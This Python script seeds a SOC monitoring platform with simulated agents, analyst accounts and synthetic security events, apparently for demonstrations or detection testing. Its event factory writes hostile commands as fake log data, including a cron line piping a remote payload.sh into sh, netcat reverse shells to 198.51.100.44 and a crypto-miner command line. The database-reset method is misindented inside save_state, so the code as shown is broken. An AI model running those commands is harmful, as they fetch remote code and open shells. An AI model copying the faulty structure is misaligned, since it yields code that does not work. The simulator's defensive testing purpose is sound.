#!/usr/bin/env python3
"""
warroom_simulator.py

Simulateur de données pour la plateforme SOC War Room.

Ce script parle au backend Spring Boot comme le feraient de vrais agents :
- enrôlement via /api/agents/enroll ;
- heartbeat via /api/agents/{agentId}/heartbeat ;
- événements via /api/agents/{agentId}/events ;
- création des utilisateurs via /api/admin/users.

Objectif : alimenter la plateforme avec un parc réaliste :
- 4 machines virtuelles simulées ;
- 4 agents rattachés aux machines ;
- 25 événements initiaux ;
- puis 1 événement par intervalle depuis un agent actif ;
- 2 agents sains, 1 agent dégradé, 1 agent bloqué ;
- 5 L1, 5 L2 et 3 managers.

Dépendance : pip install requests
"""

from __future__ import annotations

import argparse
import json
import random
import signal
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

try:
    import requests
except ImportError:
    print("Erreur: le module 'requests' est absent. Installe-le avec: pip install requests")
    sys.exit(1)


# =============================================================================
# Configuration logique de la simulation
# =============================================================================

ALL_COLLECTORS = [
    "LogCollector",
    "NetworkCollector",
    "ProcessCollector",
    "FileIntegrityCollector",
]

STATE_FILE_DEFAULT = "warroom_simulation_state.json"
DEFAULT_PASSWORD = "Warroom123!"

USERS_TO_CREATE = [
    # 5 analystes L1
    {"username": "l1.yassine", "fullName": "Yassine Benali", "role": "L1", "email": "yassine.l1@warroom.local"},
    {"username": "l1.amine", "fullName": "Amine El Idrissi", "role": "L1", "email": "amine.l1@warroom.local"},
    {"username": "l1.salma", "fullName": "Salma Berrada", "role": "L1", "email": "salma.l1@warroom.local"},
    {"username": "l1.nour", "fullName": "Nour Alaoui", "role": "L1", "email": "nour.l1@warroom.local"},
    {"username": "l1.ilyas", "fullName": "Ilyas Tazi", "role": "L1", "email": "ilyas.l1@warroom.local"},

    # 5 analystes L2
    {"username": "l2.sara", "fullName": "Sara Mansouri", "role": "L2", "email": "sara.l2@warroom.local"},
    {"username": "l2.hamza", "fullName": "Hamza El Fassi", "role": "L2", "email": "hamza.l2@warroom.local"},
    {"username": "l2.meryem", "fullName": "Meryem Chraibi", "role": "L2", "email": "meryem.l2@warroom.local"},
    {"username": "l2.omar", "fullName": "Omar Bennani", "role": "L2", "email": "omar.l2@warroom.local"},
    {"username": "l2.hajar", "fullName": "Hajar Zniber", "role": "L2", "email": "hajar.l2@warroom.local"},

    # 3 managers
    {"username": "mgr.karim", "fullName": "Karim Manager", "role": "MANAGER", "email": "karim.manager@warroom.local"},
    {"username": "mgr.leila", "fullName": "Leila Manager", "role": "MANAGER", "email": "leila.manager@warroom.local"},
    {"username": "mgr.nadia", "fullName": "Nadia Manager", "role": "MANAGER", "email": "nadia.manager@warroom.local"},
]


@dataclass
class VirtualMachine:
    hostname: str
    os_name: str
    os_version: str
    profile: str  # healthy | healthy | degraded | blocked
    ip: str
    agent_version: str = "0.1.0-simulator"


VIRTUAL_MACHINES = [
    VirtualMachine("srv-web-prod-01", "Ubuntu Server", "22.04 LTS", "healthy", "10.10.1.10"),
    VirtualMachine("srv-db-prod-01", "Debian", "12", "healthy", "10.10.1.20"),
    VirtualMachine("srv-bastion-01", "Fedora Server", "42", "degraded", "10.10.1.30"),
    VirtualMachine("srv-legacy-app-01", "Ubuntu Server", "20.04 LTS", "blocked", "10.10.1.40"),
]


# =============================================================================
# Petits utilitaires
# =============================================================================


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def safe_json(response: requests.Response) -> Any:
    try:
        return response.json()
    except Exception:
        return response.text


def truncate(text: str, max_len: int = 140) -> str:
    text = text.replace("\n", " ")
    return text if len(text) <= max_len else text[:max_len] + "..."


# =============================================================================
# Client HTTP War Room
# =============================================================================


class WarroomClient:
    def __init__(self, base_url: str, enrollment_secret: str, timeout: int = 10):
        self.base_url = base_url.rstrip("/")
        self.enrollment_secret = enrollment_secret
        self.timeout = timeout
        self.admin_session = requests.Session()

    def _url(self, path: str) -> str:
        return self.base_url + path

    def login_admin(self, username: str, password: str) -> None:
        response = self.admin_session.post(
            self._url("/api/auth/login"),
            json={"username": username, "password": password},
            timeout=self.timeout,
        )
        if response.status_code != 200:
            raise RuntimeError(
                f"Login admin échoué ({response.status_code}) : {safe_json(response)}"
            )
        print(f"[OK] Session admin ouverte : {username}")

    def get_existing_users(self) -> List[Dict[str, Any]]:
        response = self.admin_session.get(self._url("/api/admin/users"), timeout=self.timeout)
        if response.status_code != 200:
            raise RuntimeError(
                f"Impossible de lister les utilisateurs ({response.status_code}) : {safe_json(response)}"
            )
        return response.json()

    def create_user_if_absent(self, user: Dict[str, str], password: str) -> None:
        existing = self.get_existing_users()
        if any(u.get("username") == user["username"] for u in existing):
            print(f"[SKIP] Utilisateur déjà présent : {user['username']}")
            return

        payload = dict(user)
        payload["password"] = password
        response = self.admin_session.post(
            self._url("/api/admin/users"),
            json=payload,
            timeout=self.timeout,
        )
        if response.status_code in (200, 201):
            print(f"[OK] Utilisateur créé : {user['username']} ({user['role']})")
            return
        if response.status_code == 409:
            print(f"[SKIP] Utilisateur déjà existant : {user['username']}")
            return
        raise RuntimeError(
            f"Création utilisateur échouée {user['username']} ({response.status_code}) : {safe_json(response)}"
        )

    def enroll_agent(self, vm: VirtualMachine) -> Dict[str, str]:
        response = requests.post(
            self._url("/api/agents/enroll"),
            headers={"X-Enrollment-Secret": self.enrollment_secret},
            json={
                "hostname": vm.hostname,
                "osName": vm.os_name,
                "osVersion": vm.os_version,
                "agentVersion": vm.agent_version,
            },
            timeout=self.timeout,
        )
        if response.status_code not in (200, 201):
            raise RuntimeError(
                f"Enrollment échoué pour {vm.hostname} ({response.status_code}) : {safe_json(response)}"
            )
        data = response.json()
        print(f"[OK] Agent enrôlé : {vm.hostname} -> {data['agentId']}")
        return {"agentId": data["agentId"], "apiKey": data["apiKey"]}

    def update_agent_config(self, agent_id: str) -> None:
        payload = {
            "heartbeatIntervalSeconds": 30,
            "batchSize": 100,
            "retryIntervalSeconds": 10,
            "enabledCollectors": ALL_COLLECTORS,
        }
        response = self.admin_session.put(
            self._url(f"/api/admin/agents/{agent_id}/config"),
            json=payload,
            timeout=self.timeout,
        )
        if response.status_code not in (200, 204):
            raise RuntimeError(
                f"Config agent échouée {agent_id} ({response.status_code}) : {safe_json(response)}"
            )
        print(f"[OK] Configuration collecteurs appliquée : {agent_id}")

    def send_heartbeat(self, agent: "VirtualAgent") -> None:
        response = requests.post(
            self._url(f"/api/agents/{agent.agent_id}/heartbeat"),
            headers={
                "Authorization": f"Bearer {agent.api_key}",
                "Content-Type": "application/json",
            },
            json=agent.build_heartbeat(),
            timeout=self.timeout,
        )
        if response.status_code != 200:
            raise RuntimeError(
                f"Heartbeat refusé pour {agent.vm.hostname} ({response.status_code}) : {safe_json(response)}"
            )

    def send_events(self, agent: "VirtualAgent", events: List[Dict[str, str]]) -> None:
        enveloped = []
        now = utc_now()
        for event in events:
            enveloped.append(
                {
                    "agentId": agent.agent_id,
                    "hostname": agent.vm.hostname,
                    "sourceType": event["sourceType"],
                    "collectedAt": now,
                    "payload": event["payload"],
                }
            )

        response = requests.post(
            self._url(f"/api/agents/{agent.agent_id}/events"),
            headers={
                "Authorization": f"Bearer {agent.api_key}",
                "Content-Type": "application/json",
            },
            json=enveloped,
            timeout=self.timeout,
        )
        if response.status_code != 200:
            raise RuntimeError(
                f"Envoi événements refusé pour {agent.vm.hostname} ({response.status_code}) : {safe_json(response)}"
            )


# =============================================================================
# Agent virtuel
# =============================================================================


@dataclass
class VirtualAgent:
    vm: VirtualMachine
    agent_id: str
    api_key: str
    started_at: str = field(default_factory=utc_now)
    queued_events: int = 0
    delivered_events: int = 0
    failed_batches: int = 0
    dropped_events: int = 0
    enrollment_retries: int = 0
    config_refresh_failures: int = 0
    component_restarts: int = 0
    quarantined_components: List[str] = field(default_factory=list)
    blocked: bool = False
    degraded: bool = False

    def build_component_health(self) -> List[Dict[str, Any]]:
        if self.blocked:
            # Un agent bloqué ne devrait normalement plus envoyer de heartbeat.
            # Ce cas sert si on veut forcer un heartbeat rouge avant l'arrêt.
            return [
                {"componentName": c, "running": False, "statusMessage": "blocked - no progress"}
                for c in ALL_COLLECTORS
            ]

        health = []
        for c in ALL_COLLECTORS:
            running = True
            status = "running"
            if self.degraded and c in ("NetworkCollector", "FileIntegrityCollector"):
                running = False
                status = "stopped — repeated command timeout / permissions denied"
            health.append({"componentName": c, "running": running, "statusMessage": status})
        return health

    def build_heartbeat(self) -> Dict[str, Any]:
        if self.degraded:
            self.failed_batches += random.randint(0, 1)
            self.dropped_events += random.randint(0, 2)
            self.config_refresh_failures += random.randint(0, 1)
            self.component_restarts += random.randint(1, 2)
            self.quarantined_components = ["NetworkCollector"]

        return {
            "agentId": self.agent_id,
            "hostname": self.vm.hostname,
            "timestamp": utc_now(),
            "running": not self.blocked,
            "queuedEvents": self.queued_events,
            "deliveredEvents": self.delivered_events,
            "lastSuccessfulDeliveryAt": utc_now(),
            "startedAt": self.started_at,
            "componentHealth": self.build_component_health(),
            "failedBatches": self.failed_batches,
            "droppedEvents": self.dropped_events,
            "enrollmentRetries": self.enrollment_retries,
            "configRefreshFailures": self.config_refresh_failures,
            "componentRestarts": self.component_restarts,
            "quarantinedComponents": self.quarantined_components,
        }


# =============================================================================
# Génération d'événements cohérents avec tes analyzers Java
# =============================================================================


class AttackEventFactory:
    """Fabrique des payloads qui déclenchent les règles existantes côté backend."""

    AUTH_IPS = ["45.14.22.10", "185.199.110.153", "203.0.113.50", "198.51.100.77"]
    C2_IPS = ["203.0.113.70", "198.51.100.44", "45.83.91.12"]
    USERS = ["root", "admin", "postgres", "deploy", "backup", "oracle"]

    @classmethod
    def auth_failed(cls) -> Dict[str, str]:
        user = random.choice(cls.USERS)
        ip = random.choice(cls.AUTH_IPS)
        port = random.randint(42000, 60999)
        return {
            "sourceType": "linux.auth.log",
            "payload": f"May 11 18:01:22 sshd[2211]: Failed password for {user} from {ip} port {port} ssh2",
        }

    @classmethod
    def auth_root_success(cls) -> Dict[str, str]:
        ip = random.choice(cls.AUTH_IPS)
        return {
            "sourceType": "linux.auth.log",
            "payload": f"May 11 18:02:10 sshd[2250]: Accepted password for root from {ip} port 51422 ssh2",
        }

    @classmethod
    def cron_suspicious(cls) -> Dict[str, str]:
        variants = [
            "CRON[3201]: (root) CMD (curl http://198.51.100.44/payload.sh | sh)",
            "CRON[3202]: (www-data) CMD (/tmp/.x/update.sh)",
            "CRON[3203]: (root) CMD (nc 198.51.100.44 4444 -e /bin/sh)",
        ]
        return {"sourceType": "linux.syslog", "payload": "May 11 18:03:00 " + random.choice(variants)}

    @classmethod
    def service_stopped(cls) -> Dict[str, str]:
        svc = random.choice(["auditd", "ufw", "apparmor", "fail2ban"])
        return {
            "sourceType": "linux.syslog",
            "payload": f"May 11 18:04:01 systemd[1]: Stopped {svc}.service - security service",
        }

    @classmethod
    def oom_low(cls) -> Dict[str, str]:
        return {
            "sourceType": "linux.syslog",
            "payload": "May 11 18:04:22 kernel: Out of memory: Killed process 9911 (java) total-vm:4096000kB",
        }

    @classmethod
    def kernel_module(cls) -> Dict[str, str]:
        return {
            "sourceType": "linux.kern.log",
            "payload": "May 11 18:05:11 kernel: suspicious module loaded by insmod /tmp/evil.ko",
        }

    @classmethod
    def kernel_segfault(cls) -> Dict[str, str]:
        return {
            "sourceType": "linux.kern.log",
            "payload": "May 11 18:05:17 kernel: app[4452]: segfault at 0 ip 00007f error 4 in libc.so",
        }

    @classmethod
    def file_integrity(cls) -> Dict[str, str]:
        scenarios = [
            {"action": "MODIFIED", "file": "/etc/shadow", "old_hash": "aaa", "new_hash": "bbb"},
            {"action": "MODIFIED", "file": "/etc/sudoers", "old_hash": "aaa", "new_hash": "ccc"},
            {"action": "MODIFIED", "file": "/etc/passwd", "old_hash": "111", "new_hash": "222"},
            {"action": "MODIFIED", "file": "/etc/ssh/sshd_config", "old_hash": "111", "new_hash": "333"},
            {"action": "CREATED", "file": "/etc/cron.d/system-update", "hash": "999"},
            {"action": "CREATED", "file": "/home/deploy/.ssh/authorized_keys", "hash": "777"},
            {"action": "DELETED", "file": "/home/admin/.ssh/authorized_keys", "last_hash": "666"},
            {"action": "MODIFIED", "file": "/etc/cron.allow", "old_hash": "444", "new_hash": "555"},
        ]
        return {"sourceType": "file.integrity", "payload": json.dumps(random.choice(scenarios))}

    @classmethod
    def network_snapshot(cls) -> Dict[str, str]:
        c2 = random.choice(cls.C2_IPS)
        pid = random.randint(4000, 9000)
        malicious_port = random.choice(["4444", "4445", "1337", "5555", "9999"])
        proc = random.choice(["bash", "sh", "python3", "nc", "ncat"])
        payload = "\n".join(
            [
                "State Recv-Q Send-Q Local Address:Port Peer Address:Port Process",
                "LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:((\"sshd\",pid=781,fd=3))",
                f"ESTAB 0 0 10.10.1.10:51222 {c2}:{malicious_port} users:((\"{proc}\",pid={pid},fd=4))",
                f"LISTEN 0 128 0.0.0.0:{random.choice(['31337', '5555', '9099'])} 0.0.0.0:* users:((\"{proc}\",pid={pid+1},fd=5))",
            ]
        )
        return {"sourceType": "network.connections", "payload": payload}

    @classmethod
    def process_snapshot(cls) -> Dict[str, str]:
        pid = random.randint(5000, 9999)
        tool = random.choice([
            "./xmrig --url pool.minexmr.example:4444 --user wallet",
            "nc -e /bin/sh 198.51.100.44 4444",
            "msfconsole -q -x exploit",
            "python3 /tmp/reverse_shell.py",
        ])
        cpu = random.choice([82.4, 94.8, 99.1])
        payload = "\n".join(
            [
                "USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND",
                "root 1 0.0 0.1 169396 13200 ? Ss 10:00 0:01 /sbin/init",
                f"root {pid} {cpu} 4.4 999999 500000 ? R 18:06 0:20 {tool}",
                f"www-data {pid+1} 1.5 2.0 524288 163840 ? Sl 18:06 0:01 /usr/sbin/nginx",
            ]
        )
        return {"sourceType": "process.list", "payload": payload}

    @classmethod
    def audit_event(cls) -> Dict[str, str]:
        variants = [
            "type=SYSCALL msg=audit(1715440000.001:11): arch=c000003e syscall=175 success=yes exe=\"/usr/sbin/insmod\" key=\"warroom_module\"",
            "type=SYSCALL msg=audit(1715440000.002:12): arch=c000003e syscall=101 success=yes exe=\"/usr/bin/python3\" key=\"warroom_inject\"",
            "type=SYSCALL msg=audit(1715440000.003:13): arch=c000003e syscall=59 success=yes exe=\"/usr/bin/curl\" key=\"warroom_exec\"",
            "type=SYSCALL msg=audit(1715440000.004:14): arch=c000003e syscall=2 success=yes exe=\"/usr/bin/vim\" key=\"warroom_privilege\"",
        ]
        return {"sourceType": "linux.audit", "payload": random.choice(variants)}

    @classmethod
    def benign_event(cls) -> Dict[str, str]:
        return {
            "sourceType": "linux.syslog",
            "payload": "May 11 18:07:00 systemd[1]: Started Daily apt download activities.",
        }

    @classmethod
    def random_attack(cls) -> Dict[str, str]:
        # Pondération volontaire : produire plusieurs gravités et plusieurs familles.
        generators = [
            cls.auth_failed,
            cls.auth_failed,
            cls.auth_root_success,
            cls.file_integrity,
            cls.network_snapshot,
            cls.process_snapshot,
            cls.audit_event,
            cls.cron_suspicious,
            cls.service_stopped,
            cls.oom_low,
            cls.kernel_module,
            cls.kernel_segfault,
            cls.benign_event,
        ]
        return random.choice(generators)()

    @classmethod
    def initial_burst(cls, count: int) -> List[Dict[str, str]]:
        events: List[Dict[str, str]] = []

        # Séquence garantie pour déclencher les règles avec variété.
        # 5 échecs depuis la même IP déclenchent AUTH-BRUTE-01.
        brute_ip = "45.14.22.10"
        for i in range(5):
            events.append(
                {
                    "sourceType": "linux.auth.log",
                    "payload": f"May 11 18:00:{10+i:02d} sshd[120{i}]: Failed password for root from {brute_ip} port {45000+i} ssh2",
                }
            )

        guaranteed = [
            cls.auth_root_success(),
            cls.file_integrity(),
            cls.file_integrity(),
            cls.network_snapshot(),
            cls.process_snapshot(),
            cls.audit_event(),
            cls.cron_suspicious(),
            cls.service_stopped(),
            cls.oom_low(),
            cls.kernel_module(),
            cls.kernel_segfault(),
        ]
        events.extend(guaranteed)

        while len(events) < count:
            events.append(cls.random_attack())

        random.shuffle(events)
        return events[:count]


# =============================================================================
# Orchestration
# =============================================================================


class SimulationRunner:
    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.client = WarroomClient(args.base_url, args.enrollment_secret, args.timeout)
        self.state_path = Path(args.state_file)
        self.stop_event = threading.Event()
        self.agents: List[VirtualAgent] = []
        self.threads: List[threading.Thread] = []

    def load_state(self) -> Dict[str, Any]:
        if self.args.reset_state or not self.state_path.exists():
            return {"agents": {}}
        try:
            return json.loads(self.state_path.read_text(encoding="utf-8"))
        except Exception:
            return {"agents": {}}

    def save_state(self, state: Dict[str, Any]) -> None:
        self.state_path.write_text(json.dumps(state, indent=2, ensure_ascii=False), encoding="utf-8")

        def reset_database_for_simulation(self) -> None:
            """
            Réinitialise les données de simulation à chaque lancement.

            On conserve uniquement le compte admin pour pouvoir continuer
            à se connecter au backend avec admin/admin.

            Cette méthode :
            - vide toutes les tables métier sauf users et flyway_schema_history ;
            - supprime les comptes simulés L1/L2/MANAGER ;
            - supprime le fichier local warroom_simulation_state.json.
            """
        if self.args.no_db_reset:
            print("[SKIP] Reset base désactivé par option --no-db-reset.")
            return

        print("\n=== Reset base de données simulation ===")

        simulated_usernames = ", ".join(
            "'" + user["username"].replace("'", "''") + "'"
            for user in USERS_TO_CREATE
        )

        sql = f"""
        DO $$
        DECLARE
        tables_to_truncate text;
        BEGIN
        SELECT string_agg(format('%I.%I', schemaname, tablename), ', ')
        INTO tables_to_truncate
        FROM pg_tables
        WHERE schemaname = 'public'
        AND tablename NOT IN ('users', 'flyway_schema_history');
        
        IF tables_to_truncate IS NOT NULL THEN
        EXECUTE 'TRUNCATE TABLE ' || tables_to_truncate || ' RESTART IDENTITY CASCADE';
        END IF;
        END $$;
        
        DELETE FROM users
        WHERE username IN ({simulated_usernames});
        """

        command = [
            "docker", "exec", "-i",
            self.args.db_container,
            "psql",
            "-U", self.args.db_user,
            "-d", self.args.db_name,
            "-v", "ON_ERROR_STOP=1",
        ]

        result = subprocess.run(
            command,
            input=sql,
            text=True,
            capture_output=True,
        )

        if result.returncode != 0:
            raise RuntimeError(
                "Reset PostgreSQL échoué.\n"
                f"Commande : {' '.join(command)}\n"
                f"STDOUT : {result.stdout}\n"
                f"STDERR : {result.stderr}"
            )

        if self.state_path.exists():
            self.state_path.unlink()
            print(f"[OK] Fichier d'état supprimé : {self.state_path}")

        print("[OK] Base remise à zéro : agents, alertes, événements, incidents, audit, notifications supprimés.")
        print("[OK] Comptes simulés L1/L2/MANAGER supprimés.")
        print("[INFO] Le compte admin est conservé.")

    def setup_users(self) -> None:
        if self.args.skip_users:
            print("[SKIP] Création utilisateurs désactivée par option.")
            return
        print("\n=== Création des analystes et managers ===")
        self.client.login_admin(self.args.admin_username, self.args.admin_password)
        for user in USERS_TO_CREATE:
            self.client.create_user_if_absent(user, self.args.user_password)
        print(f"[INFO] Mot de passe commun des comptes simulés : {self.args.user_password}")

    def setup_agents(self) -> None:
        print("\n=== Enrôlement / configuration des agents ===")
        state = self.load_state()
        state.setdefault("agents", {})

        # On a besoin de la session admin pour configurer les collecteurs après enrollment.
        if not self.args.skip_users:
            # La session est déjà ouverte dans setup_users().
            pass
        else:
            self.client.login_admin(self.args.admin_username, self.args.admin_password)

        for vm in VIRTUAL_MACHINES:
            saved = state["agents"].get(vm.hostname)
            if saved and saved.get("agentId") and saved.get("apiKey"):
                identity = {"agentId": saved["agentId"], "apiKey": saved["apiKey"]}
                print(f"[SKIP] Agent réutilisé depuis l'état local : {vm.hostname} -> {identity['agentId']}")
            else:
                identity = self.client.enroll_agent(vm)
                state["agents"][vm.hostname] = identity

            self.client.update_agent_config(identity["agentId"])
            self.agents.append(VirtualAgent(vm=vm, agent_id=identity["agentId"], api_key=identity["apiKey"]))

        self.save_state(state)

    def send_initial_events(self) -> None:
        print(f"\n=== Burst initial : {self.args.initial_events} événements ===")
        burst = AttackEventFactory.initial_burst(self.args.initial_events)
        buckets: Dict[str, List[Dict[str, str]]] = {a.agent_id: [] for a in self.agents}

        for i, event in enumerate(burst):
            agent = self.agents[i % len(self.agents)]
            buckets[agent.agent_id].append(event)

        for agent in self.agents:
            events = buckets[agent.agent_id]
            if not events:
                continue
            self.client.send_events(agent, events)
            agent.queued_events += len(events)
            agent.delivered_events += len(events)
            print(f"[OK] {len(events):02d} événements envoyés depuis {agent.vm.hostname}")

    def heartbeat_loop(self, agent: VirtualAgent) -> None:
        start = time.time()
        while not self.stop_event.is_set():
            elapsed = time.time() - start

            if agent.vm.profile == "degraded" and elapsed >= self.args.degrade_after_seconds:
                agent.degraded = True

            if agent.vm.profile == "blocked" and elapsed >= self.args.block_after_seconds:
                agent.blocked = True
                print(f"[BLOCKED] {agent.vm.hostname} ne répond plus : plus de heartbeat, plus d'événements.")
                return

            try:
                self.client.send_heartbeat(agent)
                status = "DEGRADED" if agent.degraded else "GREEN"
                print(f"[HB] {agent.vm.hostname} -> {status}")
            except Exception as exc:
                agent.failed_batches += 1
                print(f"[WARN] Heartbeat échoué {agent.vm.hostname}: {exc}")

            self.stop_event.wait(self.args.heartbeat_interval_seconds)

    def event_loop(self) -> None:
        print("\n=== Flux continu : 1 événement par intervalle depuis un agent actif ===")
        index = 0
        while not self.stop_event.is_set():
            active_agents = [a for a in self.agents if not a.blocked]
            if not active_agents:
                print("[STOP] Aucun agent actif restant.")
                return

            agent = active_agents[index % len(active_agents)]
            index += 1
            event = AttackEventFactory.random_attack()

            try:
                self.client.send_events(agent, [event])
                agent.queued_events += 1
                agent.delivered_events += 1
                print(f"[EVT] {agent.vm.hostname} | {event['sourceType']} | {truncate(event['payload'])}")
            except Exception as exc:
                agent.failed_batches += 1
                print(f"[WARN] Envoi événement échoué {agent.vm.hostname}: {exc}")

            self.stop_event.wait(self.args.event_interval_seconds)

    def run(self) -> None:
        self.reset_database_for_simulation()
        self.setup_users()
        self.setup_agents()
        self.send_initial_events()

        print("\n=== Démarrage des boucles de simulation ===")
        for agent in self.agents:
            t = threading.Thread(target=self.heartbeat_loop, args=(agent,), daemon=True, name=f"hb-{agent.vm.hostname}")
            t.start()
            self.threads.append(t)

        event_thread = threading.Thread(target=self.event_loop, daemon=True, name="event-loop")
        event_thread.start()
        self.threads.append(event_thread)

        print("\nSimulation lancée. Ctrl+C pour arrêter proprement.")
        print(f"- Agent dégradé après {self.args.degrade_after_seconds}s : srv-bastion-01")
        print(f"- Agent bloqué après {self.args.block_after_seconds}s : srv-legacy-app-01")
        print("- Dans le dashboard, un agent devient ORANGE après ~90s sans heartbeat, RED après ~300s.")

        while not self.stop_event.is_set():
            time.sleep(0.5)

    def stop(self) -> None:
        self.stop_event.set()
        print("\n[STOP] Arrêt demandé. Fermeture des boucles...")
        for t in self.threads:
            t.join(timeout=2)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Simulateur War Room SOC")
    parser.add_argument("--base-url", default="http://localhost:8080", help="URL du backend Spring Boot")
    parser.add_argument("--enrollment-secret", default="super-secret-default-key", help="Secret X-Enrollment-Secret")
    parser.add_argument("--admin-username", default="admin", help="Username admin")
    parser.add_argument("--admin-password", default="admin", help="Mot de passe admin")
    parser.add_argument("--user-password", default=DEFAULT_PASSWORD, help="Mot de passe pour les comptes simulés")
    parser.add_argument("--state-file", default=STATE_FILE_DEFAULT, help="Fichier local pour réutiliser les agents enrôlés")
    parser.add_argument("--reset-state", action="store_true", help="Ignore l'état local et enrôle de nouveaux agents")
    parser.add_argument("--skip-users", action="store_true", help="Ne crée pas les utilisateurs")
    parser.add_argument("--initial-events", type=int, default=25, help="Nombre d'événements envoyés au démarrage")
    parser.add_argument("--event-interval-seconds", type=int, default=60, help="Intervalle entre deux événements continus")
    parser.add_argument("--heartbeat-interval-seconds", type=int, default=30, help="Intervalle des heartbeats")
    parser.add_argument("--degrade-after-seconds", type=int, default=180, help="Moment où l'agent 3 devient dégradé")
    parser.add_argument("--block-after-seconds", type=int, default=150, help="Moment où l'agent 4 se bloque")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout HTTP")
    parser.add_argument("--no-db-reset", action="store_true", help="Ne vide pas la base au démarrage")
    parser.add_argument("--db-container", default="warroom-postgres", help="Nom du conteneur PostgreSQL Docker")
    parser.add_argument("--db-user", default="warroom", help="Utilisateur PostgreSQL")
    parser.add_argument("--db-name", default="warroom", help="Nom de la base PostgreSQL")
    parser.add_argument(
        "--fast-demo",
        action="store_true",
        help="Mode démonstration rapide: événement/5s, heartbeat/10s, dégradation/30s, blocage/45s",
    )

    args = parser.parse_args()
    if args.fast_demo:
        args.event_interval_seconds = 5
        args.heartbeat_interval_seconds = 10
        args.degrade_after_seconds = 30
        args.block_after_seconds = 45
    return args


def main() -> None:
    args = parse_args()
    runner = SimulationRunner(args)

    def handle_signal(_sig: int, _frame: Any) -> None:
        runner.stop()

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    try:
        runner.run()
    except KeyboardInterrupt:
        runner.stop()
    except Exception as exc:
        runner.stop()
        print(f"\n[ERREUR] {exc}")
        sys.exit(1)


if __name__ == "__main__":
    main()